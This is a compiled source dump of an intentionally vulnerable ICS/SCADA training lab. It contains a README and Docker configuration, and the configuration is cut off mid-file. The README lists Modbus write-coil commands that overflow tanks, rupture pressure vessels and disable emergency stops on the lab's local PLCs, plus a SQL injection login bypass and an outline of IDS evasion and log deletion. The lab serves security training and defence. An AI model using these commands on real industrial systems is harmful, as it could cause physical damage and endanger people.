================================================================================
VULN-PLC FULL SOURCE CODE COMPILATION (UPDATED WITH STABILIZATION FIXES)
================================================================================
Generated: 2025-12-28 (Post-Stabilization)
Project: Vulnerable PLC Training Environment
Status: All stability fixes applied, vulnerabilities preserved
================================================================================

================================================================================
FILE: README.md
================================================================================
# Vuln-PLC v2.0
### The Complete ICS/SCADA Security Training Platform

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](docs/media/CONTRIBUTING.md)

> **A comprehensive, intentionally vulnerable industrial control system environment for security training, penetration testing practice, and ICS/SCADA research.**

---

## âš¡ Quick Start

### Option 1: Local Installation

```bash
# Clone the repository
git clone https://github.com/Taimaishu/Vuln-PLC.git
cd Vuln-PLC

# Install dependencies and start all services
./scripts/install.sh
./scripts/start_all.sh

# Install modbus-cli for attacks
pip install modbus-cli

# Access the HMI Dashboard
firefox http://localhost:8000
```

### Option 2: Docker (Recommended)

```bash
# Clone the repository
git clone https://github.com/Taimaishu/Vuln-PLC.git
cd Vuln-PLC

# Build and start all containers (one command - that's it!)
sudo docker-compose up -d

# Install modbus-cli for attacks (on your host machine)
pip install modbus-cli

# Access the web interfaces
firefox http://localhost:5000  # PLC-1
```

**Try your first attack (Modbus Coil Control):**

> **Note:** Real PLCs use **coils** for digital outputs (pumps, valves) and **registers** for analog values (levels, temps). Use Modbus function 0x05 to write coils!

```bash
# Using modbus-cli (if installed):
pip install modbus-cli

# PLC-1: Force tank overflow (coil 0 = pump1, coil 3 = valve1)
sudo modbus write-coil 127.0.0.1:5502 0 1    # Pump ON
sudo modbus write-coil 127.0.0.1:5502 3 0    # Valve CLOSED

# PLC-2: Pressure spike (coil 0 = compressor1)
sudo modbus write-coil 127.0.0.1:5503 0 1    # Compressor ON

# PLC-3: Thermal runaway (coil related to heaters)
sudo modbus write-coil 127.0.0.1:5504 0 1    # Heater ON

# PLC-4: Disable safety (coil 0 = emergency stop)
sudo modbus write-coil 127.0.0.1:5505 0 0    # Emergency stop OFF

# Watch the consequences on HMI: http://localhost:8000 (local) or check PLC web interfaces (Docker)
```

**Python alternative (raw Modbus):**
```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('127.0.0.1', port=5502)
client.write_coil(0, True)   # Turn pump ON
client.write_coil(3, False)  # Close valve
client.close()
```

---

## ðŸŽ¬ Interactive Demo Scripts

**New to ICS attacks? Start here!** We've created interactive demo scripts that show you exactly how Modbus attacks affect the PLCs in real-time.

### Quick Demo (Recommended for First-Time Users)

```bash
# Start containers
sudo docker-compose up -d

# Run the visual demo - executes 6 real attacks!
python3 demo_with_visuals.py

# Watch the effects in your browser:
# http://localhost:5000/process (login: admin/admin)
```

**What you'll see:**
- âœ… 6 realistic attack scenarios executed live
- âœ… Real-time state changes in the web UI
- âœ… Detailed explanations of each attack's impact
- âœ… Visual indicators showing pump/valve status changes

### Available Demo Tools

**1. Full Interactive Demo** (`demo_with_visuals.py`)
```bash
python3 demo_with_visuals.py
```
Executes all 6 attacks with detailed output:
- Tank overflow attack (pump ON + valve CLOSED)
- Pressure vessel rupture (compressor ON + relief valve CLOSED)
- Safety system bypass (emergency stop + interlock DISABLED)

**2. Quick Verification** (`quick_test.sh`)
```bash
bash quick_test.sh
```
Tests if Modbus attacks are working and visible in the web UI. Perfect for troubleshooting.

**3. Complete Visual Guide** (`ATTACK_DEMO.md`)
- Step-by-step screenshots and examples
- Explains WHERE to look in the web UI
- Troubleshooting tips
- Understanding cause-and-effect

### Understanding the Attacks

The demo scripts help you see the **cause-and-effect** relationship:

```
Terminal (Cause)                    Browser (Effect)
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€              â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
modbus write-coil                   Pump 1 Status: false
127.0.0.1:5502 0 1     â”€â”€â”€â”€â”€â”€â–º     Changes to TRUE âœ“
(Turn pump ON)                      (Visible in 2 seconds)
```

**Why this matters:** In real ICS attacks, adversaries use Modbus to control equipment while operators watch helplessly on their HMI screens. These demos let you experience both sides!

---

## ðŸŽ“ Interactive Training Scenarios

**NEW!** Realistic ICS/SCADA attack scenarios for comprehensive security training. Each scenario includes step-by-step execution, real-world parallels, MITRE ATT&CK mappings, and blue team detection indicators.

### Quick Start

```bash
# Run the interactive training menu
./training_scenarios.py

# Or directly with Python
python3 training_scenarios.py
```

### 7 Professional Training Scenarios

**1. Reconnaissance - System Discovery** `[Beginner]`
- Network discovery and PLC fingerprinting
- Port scanning techniques
- MITRE ATT&CK: T0840 - Network Connection Enumeration
- Teaches attackers how to map ICS networks, defenders how to detect scanning

**2. Tank Overflow Attack (PLC-1)** `[Intermediate]`
- Manipulate pump and valve controls to cause overflow
- Real-world parallel: Water treatment facility attacks
- MITRE ATT&CK: T0836 - Modify Parameter
- Learn process manipulation and safety system impacts

**3. Pressure Vessel Rupture (PLC-2)** `[Advanced]`
- Over-pressurize vessel by disabling safety controls
- Real-world parallel: Triton/TRISIS safety system attacks
- MITRE ATT&CK: T0816 - Device Restart/Shutdown
- Critical infrastructure sabotage techniques

**4. Thermal Stress Attack (PLC-3)** `[Intermediate]`
- Equipment degradation through rapid thermal cycling
- Real-world parallel: Stuxnet equipment degradation methodology
- MITRE ATT&CK: T0879 - Damage to Property
- Subtle, long-term damage attacks

**5. Safety System Shutdown (PLC-4)** `[Expert]`
- Disable emergency stop and safety interlocks
- Most dangerous scenario with safety warnings
- MITRE ATT&CK: T0816 - Device Restart/Shutdown
- Learn why safety systems are the primary target

**6. Multi-Stage APT Campaign** `[Expert]`
- Coordinated attack across all 4 PLCs
- Real-world parallel: Nation-state APT campaigns
- Multiple MITRE ATT&CK techniques
- **TESTED:** 100% success rate, all 4 PLCs compromised, 10 alerts generated
- Demonstrates cascading system failure and incident response

**7. Stealthy Reconnaissance** `[Intermediate]`
- Covert intelligence gathering with detection evasion
- Learn how attackers avoid triggering alarms
- MITRE ATT&CK: T0888 - Remote System Information Discovery
- Advanced techniques for both red and blue teams

### Training Features

Each scenario includes:
- âœ… Clear learning objectives and difficulty levels
- âœ… MITRE ATT&CK for ICS technique mappings
- âœ… Real-world attack parallels (Stuxnet, Triton, Industroyer)
- âœ… Step-by-step execution with explanations
- âœ… Expected impact analysis (physical, financial, safety)
- âœ… Blue team detection indicators and response procedures
- âœ… Color-coded terminal output for better learning
- âœ… Interactive confirmations for dangerous attacks
- âœ… Both offensive (red team) and defensive (blue team) perspectives

### Training Paths

**For Beginners:**
1. Start with Scenario 1 (Reconnaissance)
2. Progress to Scenario 2 (Tank Overflow)
3. Try Scenario 7 (Stealthy Reconnaissance)

**For Intermediate Users:**
- Focus on Scenarios 2, 4, and 7
- Study blue team detection indicators
- Practice both attack and defense

**For Advanced Users:**
- Scenarios 3, 5, and 6
- Multi-stage APT campaigns
- Incident response procedures

**For Expert Red Teams:**
- Scenario 6 (Multi-Stage APT) - Nation-state level attack
- Develop custom attack chains
- Practice covert persistence

### Real-World Attack Parallels

Our scenarios are based on actual ICS attacks:
- **Stuxnet (2010):** Equipment degradation through process manipulation
- **Triton/TRISIS (2017):** Safety system targeting
- **BlackEnergy (2015):** Multi-stage campaigns against utilities
- **Industroyer (2016):** Coordinated ICS attacks

### Documentation

See [TRAINING_GUIDE.md](TRAINING_GUIDE.md) for:
- Detailed scenario descriptions
- Blue team response playbooks
- Incident response procedures
- Safety and ethics guidelines
- Contributing new scenarios

### Integration with Alert System

All training scenarios trigger real-time alerts in the web interface:
- View at http://localhost:5000/process (login: admin/admin)
- Filter alerts by PLC or severity
- Export to CSV for incident reports
- Study attack patterns and timelines

**Example: Scenario 6 (APT Campaign) generates:**
- 10+ alerts across all 4 PLCs
- 80% CRITICAL severity
- Clear coordinated attack pattern
- Complete incident timeline for analysis

---

## ðŸŒŸ What's New in v2.0?

### ðŸ”¥ Real Modbus TCP on ALL 4 PLCs
**Production-quality Modbus implementation across the entire system:**
- âœ… **PLC1 (Tank):** Port 5502 - Full Modbus TCP server
- âœ… **PLC2 (Pressure):** Port 5503 - Full Modbus TCP server
- âœ… **PLC3 (Temperature):** Port 5504 - Full Modbus TCP server
- âœ… **PLC4 (Safety/ESD):** Port 5505 - Full Modbus TCP server

**Not fake HTTP endpoints** - actual Modbus TCP protocol with:
- Proper MBAP header parsing
- **6 Modbus function codes:** 0x01, 0x03, 0x05, 0x06, 0x0F, 0x10
- **Realistic control:** Coils for pumps/valves, Registers for levels/temps
- Stability improvements (recv_exact, connection semaphore, socket timeout)
- Works with real tools: `modbus-cli`, `pymodbus`, Metasploit SCADA modules

### ðŸš¨ Multi-PLC Visual Alert System
**Real-time attack detection and visualization across all 4 PLCs:**

All PLCs now feature integrated intrusion detection with live visual alerts in the web UI:

- âœ… **Unified Alert System:** All 4 PLCs share security alerts through common state volume
- âœ… **Real-Time Detection:** Modbus write operations trigger immediate alerts
- âœ… **Animated UI Alerts:** Red pulsing banners for CRITICAL, orange for WARNING
- âœ… **PLC Identification:** Every alert tagged with source PLC (PLC-1, PLC-2, PLC-3, PLC-4)
- âœ… **Severity Levels:** Automatic classification based on target address
- âœ… **Alert History:** Last 50 alerts visible in web dashboard with timestamps

**What Gets Detected:**
- **PLC-1 (Tank):** CRITICAL alerts for pump/valve tampering (coils 0, 1)
- **PLC-2 (Pressure):** CRITICAL alerts for compressor/relief valve (coils 0, 4)
- **PLC-3 (Temperature):** CRITICAL alerts for heater/cooler control (coils 0, 2)
- **PLC-4 (Safety):** ALL writes flagged as CRITICAL (emergency shutdown system)

**Try It Out:**
```bash
# Start containers
sudo docker-compose up -d

# Open web UI: http://localhost:5000/process (login: admin/admin)

# Run automated test across all PLCs
python3 test_all_plcs.py

# Or use interactive attack tool
python3 attack.py

# Watch RED PULSING alerts appear in real-time!
```

**Visual Features:**
- ðŸ”´ **CRITICAL alerts:** Red pulsing banner with slide-down animation
- ðŸŸ  **WARNING alerts:** Orange banner with warning icon
- ðŸ“Š **Alert grouping:** Organized by source PLC in history view
- â° **Timestamps:** Precise timing for incident response training
- ðŸŽ¯ **Attack details:** Function code, address, source IP displayed

**Advanced Filtering & Export:**
- ðŸ” **Filter by PLC:** Show alerts from specific PLCs (PLC-1, PLC-2, PLC-3, PLC-4)
- ðŸŽšï¸ **Filter by Severity:** Display only CRITICAL, WARNING, or HIGH alerts
- ðŸ”„ **Real-time Updates:** Filters apply instantly without page reload
- ðŸ“Š **Alert Count:** Shows "Showing X of Y" when filters are active
- ðŸ“¥ **CSV Export:** Download all alerts or only filtered results
- ðŸ§¹ **Clear Filters:** One-click reset to show all alerts

**Use Cases:**
- **Incident Response:** Filter to "PLC-4 + CRITICAL only" â†’ Export 17 safety attacks
- **Training:** Filter to "PLC-1 only" â†’ Focus students on one system
- **Alert Triage:** Filter to "CRITICAL only" â†’ Prioritize highest severity
- **Forensics:** Export filtered CSV for incident reports and compliance

This creates an immersive blue team training experience - watch operators get real-time notifications as attacks happen!

### ðŸŽ¨ Visual SCADA HMI Interface
Real-time P&ID dashboard showing industrial processes:
- Animated tank levels, pressure gauges, temperature displays
- Color-coded alarms (green â†’ yellow â†’ red)
- Live equipment status indicators
- Emergency shutdown warnings
- **See attacks happen visually!**

### âš—ï¸ Physics-Based Process Simulation
Not just fake numbers - actual industrial physics:
- Tank overflow with pump cavitation
- Pressure vessel rupture
- Thermal runaway scenarios
- Safety interlocks and emergency shutdown

### ðŸ“¦ PCAP Capture & Forensics
Built-in Modbus IDS with packet capture:
- Real-time intrusion detection
- Automatic PCAP file rotation
- Wireshark-ready for analysis
- Timeline reconstruction for incident response

### ðŸ³ Docker Deployment Available
Full Docker deployment with 8 services and proper network segmentation.
See [Docker Installation](#docker-installation) section for setup instructions.

---

## ðŸŽ¯ Features

### ðŸ”´ Red Team / Penetration Testing
- **4 Vulnerable PLCs** with realistic exploits
- **Real Modbus TCP on ALL PLCs** - protocol-accurate implementation
- **4 Modbus TCP endpoints** (ports 5502-5505) - all fully functional
- **Siemens S7** protocol support
- **Web exploits**: SQL injection, command injection, XSS
- **Authentication bypasses**
- **Session hijacking**
- **Privilege escalation paths**

### ðŸ”µ Blue Team / Defenders
- **Multi-PLC Visual Alert System** with real-time attack detection
- **Animated security alerts** - red pulsing CRITICAL, orange WARNING banners
- **Unified alert dashboard** - all 4 PLCs report to single view
- **Advanced filtering** - filter by PLC and severity for rapid triage
- **CSV export** - download filtered alerts for incident reports
- **Alert analytics** - real-time count and filtering statistics
- **Modbus IDS** with signature & anomaly detection
- **PCAP capture** for forensics training
- **System Monitor** dashboard
- **Detection playbooks** with IOCs
- **Incident response exercises**

### ðŸŽ“ Educators / Trainers
- **Visual HMI** for engaging demonstrations
- **400+ pages documentation**
- **Step-by-step attack scenarios**
- **Blue team defense guides**
- **CTF-ready challenges**

---

## ðŸ—ï¸ Architecture

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  DMZ (192.168.50.0/24)                  â”‚
â”‚  â”œâ”€ HMI Interface (Visual SCADA)        â”‚
â”‚  â”œâ”€ System Monitor (Dashboard)          â”‚
â”‚  â””â”€ Historian (Data Collection)         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
              â”‚
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  OT Network (192.168.100.0/24)          â”‚
â”‚  â”œâ”€ PLC-1: Tank Control                 â”‚
â”‚  â”œâ”€ PLC-2: Pressure System              â”‚
â”‚  â”œâ”€ PLC-3: Temperature Control          â”‚
â”‚  â”œâ”€ PLC-4: Safety/ESD                   â”‚
â”‚  â”œâ”€ Modbus IDS (Monitoring)             â”‚
â”‚  â””â”€ Physical Process Simulator          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Tech Stack:**
- Python 3.9 + Flask
- PyModbus (Modbus TCP)
- Python-snap7 (S7 protocol)
- Scapy (Packet capture)
- Docker + Docker Compose

---

## ðŸ“š Documentation

### Getting Started
- **[Quick Start Guide](docs/getting-started/QUICK_START.md)** - Get running in 5 minutes
- **[Installation Guide](docs/getting-started/INSTALL_GUIDE.md)** - Detailed setup
- **[Docker Deployment](docs/getting-started/DOCKER_DEPLOYMENT.md)** - Container setup

### Attack Documentation
- **[Attack Scenarios](docs/attack/ATTACK_SCENARIOS.md)** - Step-by-step exploits
- **[Evasion Techniques](docs/attack/EVASION_TECHNIQUES.md)** - Advanced tactics
- **[Modbus CLI Reference](docs/attack/MODBUS_CLI_REFERENCE.md)** - Command syntax
- **[Privilege Escalation](docs/attack/PRIVILEGE_ESCALATION.md)** - Exploit chains

### Defense Documentation
- **[Blue Team Guide](docs/defense/BLUE_TEAM_GUIDE.md)** - Defense strategies
- **[Detection Playbook](docs/defense/DETECTION_PLAYBOOK.md)** - IOCs & alerts
- **[PCAP Analysis](docs/defense/)** - Forensics exercises

### Architecture & Advanced
- **[Architecture Overview](docs/architecture/ARCHITECTURE.md)** - System design
- **[Advanced Features](docs/architecture/ADVANCED_FEATURES.md)** - PLC engine, IDS
- **[Development Roadmap](docs/architecture/ROADMAP.md)** - Future plans

---

## ðŸš€ Usage

### Access Interfaces

**Main Dashboards:**
- **HMI Dashboard:** http://localhost:8000 ðŸŽ¨
- **System Monitor:** http://localhost:5999 ðŸ“Š
- **Historian:** http://localhost:8888 (historian/data123) ðŸ“ˆ

**PLC Web Interfaces:**
- **PLC-1 (Tank):** http://localhost:5000 (admin/admin)
- **PLC-2 (Pressure):** http://localhost:5011 (engineer/plc2pass)
- **PLC-3 (Temperature):** http://localhost:5012 (engineer/temp123)
- **PLC-4 (Safety):** http://localhost:5013 (safety_eng/safe123)

**Modbus TCP Endpoints (All Fully Functional):**
- PLC-1: `127.0.0.1:5502` âœ… Real Modbus TCP
- PLC-2: `127.0.0.1:5503` âœ… Real Modbus TCP
- PLC-3: `127.0.0.1:5504` âœ… Real Modbus TCP
- PLC-4: `127.0.0.1:5505` âœ… Real Modbus TCP

### Example Attacks

**Testing All PLCs (Visual Alert System with Filtering):**
```bash
# Automated test - executes 8 attacks across all 4 PLCs
python3 test_all_plcs.py

# Interactive attack menu - choose your target
python3 attack.py

# Open web UI to see visual alerts: http://localhost:5000/process (admin/admin)
# Watch RED PULSING banners appear as attacks are detected!

# In the web UI, try the filtering features:
# - Uncheck PLC-1, PLC-2, PLC-3 to see only PLC-4 alerts
# - Uncheck WARNING/HIGH to see only CRITICAL alerts
# - Click "Export to CSV" to download filtered results
# - Click "Clear Filters" to reset
```

**Tank Overflow (PLC-1 - Visual Impact):**
```bash
# Open HMI: http://localhost:8000
sudo modbus write-coil 127.0.0.1:5502 0 1   # Force pump ON (coil 0)
sudo modbus write-coil 127.0.0.1:5502 3 0   # Force valve CLOSED (coil 3)
# Watch tank overflow in real-time!
```

**Pressure Vessel Rupture (PLC-2):**
```bash
sudo modbus write-coil 127.0.0.1:5503 0 1   # Compressor ON (coil 0)
sudo modbus write-coil 127.0.0.1:5503 4 0   # Relief valve CLOSED (coil 4)
# Pressure rises until rupture
```

**Thermal Runaway (PLC-3):**
```bash
# Control heaters/coolers via coils
sudo modbus write-coil 127.0.0.1:5504 0 1   # Heater 1 ON (coil 0)
sudo modbus write-coil 127.0.0.1:5504 2 0   # Cooler 1 OFF (coil 2)
# Temperature rises uncontrollably
```

**Safety System Bypass (PLC-4):**
```bash
# Disable safety via coils (digital outputs)
sudo modbus write-coil 127.0.0.1:5505 0 0   # Disable emergency stop
sudo modbus write-coil 127.0.0.1:5505 1 0   # Disable safety interlock
# All safety systems now bypassed - catastrophic!
```

> **Technical Note:** Coils (0x05/0x0F) control digital outputs like pumps and valves. Registers (0x06/0x10) set analog values like setpoints and speeds. This matches real industrial PLCs!

**SQL Injection (Web Interface):**
```bash
curl -X POST http://localhost:5000/login \
  -d "username=admin' OR '1'='1&password=x"
```

**More scenarios:** See [docs/attack/ATTACK_SCENARIOS.md](docs/attack/ATTACK_SCENARIOS.md)

---

## ðŸ“š Suggested Learning Path

New to ICS security? Follow this structured progression from beginner to advanced:

### **Phase 0: Interactive Demos** â­ Start Here!
**Goal:** See attacks in action before diving deep

**ðŸŽ¬ Run the visual demo first:**
```bash
python3 demo_with_visuals.py  # Watch 6 attacks happen live!
```

This gives you immediate hands-on experience and shows the cause-and-effect relationship between Modbus commands and physical equipment. Once you've seen the attacks work, you'll understand what you're looking for in the phases below.

**ðŸ“– Read the visual guide:**
- Open `ATTACK_DEMO.md` for detailed explanations
- Learn WHERE to see attack effects in the web UI
- Understand the different types of industrial attacks

### **Phase 1: Reconnaissance & Enumeration**
**Goal:** Understand the target environment

1. **Discovery:** Use `nmap` to identify Modbus services
   ```bash
   nmap -p 502,5502-5505 localhost
   ```

2. **Enumerate PLCs:** Access each web interface and explore functionality
   - Map out available features (dashboards, controls, settings)
   - Identify user roles and permissions
   - Document default credentials

3. **Protocol Analysis:** Capture and analyze Modbus traffic
   ```bash
   sudo tcpdump -i lo port 5502 -w capture.pcap
   ```

### **Phase 2: Basic Attacks**
**Goal:** Exploit fundamental vulnerabilities

4. **Authentication Bypass:** Test SQL injection on login forms
   ```bash
   curl -X POST http://localhost:5000/login -d "username=admin' OR '1'='1&password=x"
   ```

5. **Modbus Manipulation:** Send unauthorized commands
   ```bash
   sudo modbus 127.0.0.1:5502 write 0 1  # Force pump ON
   ```

6. **Information Disclosure:** Exploit directory traversal and verbose errors

### **Phase 3: Advanced Exploitation**
**Goal:** Chain vulnerabilities for maximum impact

7. **Historian Tampering:** Manipulate time-series data
   - Inject false readings to hide attacks
   - Delete audit logs for forensic anti-analysis

8. **Session Hijacking:** Steal and reuse session tokens
   - Escalate from guest to admin
   - Maintain persistent access

9. **Command Injection:** Execute arbitrary OS commands via vulnerable inputs

### **Phase 4: Evasion & Persistence**
**Goal:** Avoid detection and maintain access

10. **IDS Evasion:** Learn to bypass the Modbus IDS
    - Slow down attack pace to avoid rate-limiting
    - Use valid function codes
    - Mimic normal traffic patterns

11. **Traffic Replay:** Capture and replay legitimate commands

12. **Covert Channels:** Hide malicious commands in normal operations

### **Phase 5: Defense**
**Goal:** Think like a blue teamer

13. **Review PCAP Files:** Analyze `pcaps/` for attack indicators

14. **Configure IDS Rules:** Tune detection signatures in `monitoring/modbus_ids.py`

15. **Incident Response:** Practice identifying and containing breaches

**ðŸ“– Deep Dive:** Each phase has detailed walkthroughs in [docs/attack/](docs/attack/)

---

## âš™ï¸ Installation

### Requirements
- **Required:** Python 3.9+, pip
- **Optional:** Docker + Docker Compose (for containerized deployment)

### Local Installation
```bash
git clone https://github.com/Taimaishu/Vuln-PLC.git
cd Vuln-PLC

# Install dependencies
./scripts/install.sh

# Start all services
./scripts/start_all.sh

# Stop all services
./scripts/stop_all.sh

# Check status
./scripts/status.sh
```

### Docker Installation

**Step 1: Install Prerequisites**
```bash
# Install Docker Compose (if not already installed)
sudo apt update
sudo apt install docker-compose

# Verify installation
docker-compose --version
```

**Step 2: Clone and Deploy**
```bash
# Clone the repository
git clone https://github.com/Taimaishu/Vuln-PLC.git
cd Vuln-PLC

# Build and start containers (builds images automatically on first run)
sudo docker-compose up -d

# This will:
# - Build Docker images from Dockerfile (first time only, ~2 minutes)
# - Create networks and volumes
# - Start all 7 containers
```

**Step 3: Verify It's Running**
```bash
# Check all containers are up
sudo docker-compose ps

# You should see 7 services running:
# - vuln-plc1, vuln-plc2, vuln-plc3, vuln-plc4
# - vuln-historian
# - vuln-hmi-server
# - vuln-system-monitor
```

**Step 4: Access the Interfaces**
- **PLC-1:** http://localhost:5000 (admin/admin)
- **PLC-2:** http://localhost:5011 (engineer/plc2pass)
- **PLC-3:** http://localhost:5012 (engineer/temp123)
- **PLC-4:** http://localhost:5013 (safety_eng/safe123)
- **Historian:** http://localhost:8888 (historian/data123)
- **HMI Interface:** http://localhost:8000 (Visual SCADA)
- **System Monitor:** http://localhost:5999

**Optional: Full Deployment (with IDS & Network Sim)**
```bash
# Includes Modbus IDS and Network Traffic Simulator
sudo docker-compose --profile full up -d
```

**Managing Containers:**
```bash
# View logs
sudo docker-compose logs -f

# Stop all services
sudo docker-compose down

# Restart
sudo docker-compose restart

# Rebuild images after code changes
sudo docker-compose build
sudo docker-compose up -d
```

> **Note:** No need to pull images - `docker-compose up` automatically builds everything from the Dockerfile in the repo!

---

## ðŸ—ºï¸ Roadmap

### Q1 2025: Additional Protocols
- âœ¨ EtherNet/IP (CIP) - Allen-Bradley/Rockwell
- âœ¨ DNP3 - Power utility SCADA
- âœ¨ OPC UA - Industry 4.0

### Q2 2025: Enhanced Realism
- ðŸ“ˆ HMI trend charts (historian views)
- ðŸ–¥ï¸ VNC-based Windows HMI
- ðŸ”§ Vendor-specific CVE emulation

### Q3 2025: Advanced Features
- ðŸ¤– ML-based anomaly detection
- ðŸ” Automated attack scenarios
- ðŸ¯ Honeypot capabilities

See **[ROADMAP.md](docs/architecture/ROADMAP.md)** for complete timeline.

---

## ðŸ¤ Contributors Welcome!

**ICS security labs are rare â€” your contributions make a real impact on the community!**

We're actively looking for contributors to help make Vuln-PLC the best ICS training platform. Whether you're a seasoned ICS expert or just getting started, there's a place for you here.

### ðŸ”¥ High-Impact Contributions

**Protocol Implementations** (Python experience needed)
- âœ¨ **EtherNet/IP (CIP)** - Allen-Bradley/Rockwell automation
- âœ¨ **DNP3** - Power utility SCADA protocol
- âœ¨ **OPC UA** - Industry 4.0 standard
- âœ¨ **BACnet** - Building automation systems

**Visual Enhancements** (Frontend/JavaScript)
- ðŸ“ˆ **HMI Trend Charts** - Real-time historian data visualization
- ðŸ–¥ï¸ **Advanced P&ID Diagrams** - Interactive process flows
- ðŸŽ¨ **Modern UI/UX** - Improve web interface design

**Security Features** (Security/ML experience)
- ðŸ¤– **ML-based Anomaly Detection** - Enhance IDS capabilities
- ðŸ” **Traffic Analysis Tools** - PCAP parsing and visualization
- ðŸ›¡ï¸ **Defense Playbooks** - Blue team training scenarios

### ðŸ“š Documentation Contributions

**Always Needed:**
- ðŸŽ¥ **Video Tutorials** - Walkthrough attacks and defenses
- ðŸ† **CTF Challenges** - Create capture-the-flag scenarios
- ðŸ“– **Training Materials** - Lesson plans for educators
- ðŸŒ **Translations** - Help reach global audience
- âœï¸ **Blog Posts** - Write about your experiments

### ðŸ’¡ Quick Contribution Ideas

**Good First Issues:**
- Add new vulnerable endpoints to existing PLCs
- Create additional attack scenarios
- Improve error messages and logging
- Add unit tests for core functionality
- Fix typos and improve documentation clarity

### ðŸš€ How to Get Started

1. **Fork the repo** and explore the codebase
2. **Check [Issues](https://github.com/Taimaishu/Vuln-PLC/issues)** for "good first issue" tags
3. **Join discussions** - Ask questions, share ideas
4. **Submit a PR** - Even small improvements matter!

See **[CONTRIBUTING.md](docs/media/CONTRIBUTING.md)** for detailed guidelines.

**â­ Show Support:** Star the repo if you find it useful â€” it helps others discover the project!

---

## âš ï¸ Security Notice

**THIS IS INTENTIONALLY VULNERABLE SOFTWARE FOR EDUCATIONAL PURPOSES.**

**DO:**
- âœ… Use in isolated lab environments
- âœ… Practice authorized penetration testing
- âœ… Learn ICS security principles
- âœ… Develop defensive capabilities

**DON'T:**
- âŒ Deploy on production networks
- âŒ Expose to the internet
- âŒ Use for malicious purposes
- âŒ Test on systems you don't own

**Use responsibly. Get authorization. Follow the law.**

---

## ðŸ“œ License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## ðŸ™ Acknowledgments

- ICS security community
- Open-source contributors
- Security researchers worldwide

Special thanks to all who provided feedback and feature requests.

---

## ðŸ“ž Contact & Support

- **Issues:** [GitHub Issues](https://github.com/Taimaishu/Vuln-PLC/issues)
- **Discussions:** [GitHub Discussions](https://github.com/Taimaishu/Vuln-PLC/discussions)
- **Pull Requests:** Always welcome!

---

## ðŸ”— Related Projects

- **[Conpot](https://github.com/mushorg/conpot)** - ICS honeypot
- **[SCADABR](https://github.com/SCADA-LTS/Scada-LTS)** - Open source SCADA
- **[PLCSimulator](https://github.com/automaticserver/plc4j)** - PLC communication library

---

## â­ Star History

If you find Vuln-PLC useful, please consider starring the repository!

---

**Built with â¤ï¸ for the ICS security community**

*Last Updated: 2025-12-28*
*Version: 2.0.0*



================================================================================
FILE: requirements.txt
================================================================================
Flask==2.3.0
pymodbus==2.5.3
Werkzeug==2.3.0

# Advanced features
scapy>=2.5.0
python-snap7>=1.3



================================================================================
FILE: docker-compose.yml
================================================================================
# Vulnerable PLC - Complete ICS/SCADA Training Environment
# Includes: 4 PLCs, Historian, Modbus IDS, System Monitor, Network Simulator

services:
  # =============================================================================
  # PLC-1: Tank Control System (OT Network)
  # =============================================================================
  plc1:
    build: .
    container_name: vuln-plc1
    hostname: plc1
    command: python core/app.py
    ports:
      - "5000:5000"   # Web interface
      - "5502:5502"   # Modbus TCP
    volumes:
      - ./logs:/app/logs
      - ./pcaps:/app/pcaps
      - plc1_state:/tmp
      - shared_state:/app/shared
    environment:
      - FLASK_ENV=development
      - PLC_ID=plc1
      - PLC_NAME=Tank Control System
    networks:
      ot_network:
        ipv4_address: 192.168.100.10
    restart: unless-stopped

  # =============================================================================
  # PLC-2: Pressure Control System (OT Network)
  # =============================================================================
  plc2:
    build: .
    container_name: vuln-plc2
    hostname: plc2
    command: python core/plc2_pressure.py
    ports:
      - "5011:5011"   # Web interface
      - "5503:5503"   # Modbus TCP
    volumes:
      - ./logs:/app/logs
      - ./pcaps:/app/pcaps
      - plc2_state:/tmp
      - shared_state:/app/shared
    environment:
      - FLASK_ENV=development
      - PLC_ID=plc2
      - PLC_NAME=Pressure Control System
    networks:
      ot_network:
        ipv4_address: 192.168.100.11
    restart: unless-stopped

  # =============================================================================
  # PLC-3: Temperature Control System (OT Network)
  # =============================================================================
  plc3:
    build: .
    container_name: vuln-plc3
    hostname: plc3
    command: python core/plc3_temperature.py
    ports:
      - "5012:5012"   # Web interface
      - "5504:5504"   # Modbus TCP
    volumes:
      - ./logs:/app/logs
      - ./pcaps:/app/pcaps
      - plc3_state:/tmp
      - shared_state:/app/shared
    environment:
      - FLASK_ENV=development
      - PLC_ID=plc3
      - PLC_NAME=Temperature Control System
    networks:
      ot_network:
        ipv4_address: 192.168.100.12
    restart: unless-stopped

  # =============================================================================
  # PLC-4: Safety/Emergency Shutdown System (OT Network)
  # =============================================================================
  plc4:
    build: .
    container_name: vuln-plc4
    hostname: plc4
    command: python core/plc4_safety.py
    ports:
      - "5013:5013"   # Web interface
      - "5505:5505"   # Modbus TCP
    volumes:
      - ./logs:/app/logs
      - ./pcaps:/app/pcaps
      - plc4_state:/tmp
      - shared_state:/app/shared
    environment:
      - FLASK_ENV=development
      - PLC_ID=plc4
      - PLC_NAME=Safety System
    networks:
      ot_network:
